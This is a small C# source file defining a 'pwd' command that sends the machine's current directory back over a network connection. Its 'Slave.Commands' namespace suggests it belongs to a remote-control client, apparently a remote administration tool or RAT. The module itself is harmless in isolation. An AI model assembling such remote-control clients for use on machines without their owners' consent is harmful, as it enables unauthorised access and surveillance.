using System.Collections.Generic;
using System.IO;
using Shared;

namespace Slave.Commands.Core
{
    internal class PWD : ICommand
    {
        public string name { get; set; } = "pwd";


        public void Process(List<string> args)
            => SlaveCommandsManager.networkManager.WriteLine(Directory.GetCurrentDirectory());
    }
}
